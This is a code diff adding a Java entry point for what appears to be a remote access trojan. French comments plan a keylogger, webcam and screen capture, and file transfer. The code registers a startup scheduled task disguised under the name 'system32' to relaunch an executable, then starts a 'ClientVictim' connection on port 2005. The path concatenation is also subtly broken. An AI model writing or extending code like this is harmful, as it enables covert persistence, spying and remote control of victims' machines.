@@ -1,0 +1,48 @@
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.InetAddress;
+
+
+public class Main {
+
+	
+	// LOG fichier [OK]
+	// appels systèmes [OK]
+	// gestionnaire de taches 
+	// Ajouts de fonctions préfaites (ouvrir internet explorer, etc.)
+		// client envoie/réception de fichiers (entrée : chemin du fichier)
+		// Envoyer captures webcam
+		// Envoyer captures écrans
+		// keylogger
+		
+	
+	private static final String IP = "127.0.0.1";
+	private static final int PORT = 2005;
+	
+	public static void main(String[] args) {
+		// TODO Auto-generated method stub
+
+		//KeyLogger keylogger = new KeyLogger();
+		
+		Process p;
+		try {
+			p = Runtime.getRuntime().exec("cmd /c echo %CD%");
+			BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream(), "cp850"));
+			String path = b.readLine();
+			System.out.println(path);
+			path += "\testR.exe";
+			Runtime.getRuntime().exec("cmd /c schtasks /create /sc onstart /tn \"system32\" /tr "+path);
+
+		} catch (Exception e1) {
+			// TODO Auto-generated catch block
+			e1.printStackTrace();
+		}
+		
+		ClientVictim c = new ClientVictim( "", 2005);
+		//keylogger.closeBuffer();
+		c.start();
+		
+	}
+
+}
